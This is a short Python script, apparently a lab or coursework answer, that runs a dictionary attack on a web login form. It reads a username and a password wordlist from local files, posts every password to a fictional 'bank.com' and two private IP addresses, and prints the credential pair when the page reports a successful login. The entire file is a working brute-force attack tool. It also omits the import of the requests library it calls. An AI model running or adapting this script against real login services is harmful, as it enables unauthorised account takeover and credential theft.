# Read the username from the current directory
with open("Q1", "r") as f:
    username = f.read().strip()

# Read all possible passwords from the dictionary file
with open("Q2dictionary.txt", "r") as passes:
    passwords = [line.strip() for line in passes]

# List of possible URLs to try
urls = [
    "http://bank.com/",
    "http://10.13.4.80/",
    "http://10.13.4.81/"
]

# Try each URL until one works
for url in urls:
    try:
        for pwd in passwords:
            payload = {'username': username, 'password': pwd, 'submit': 'submit'}
            r = requests.post(url, data=payload)

            if 'You Logged In' in r.text:
                print(f"Success at {url} -> {username}: {pwd}")
                exit()  # Exit after successful login
    except requests.RequestException as e:
        print(f"Could not connect to {url}: {e}")
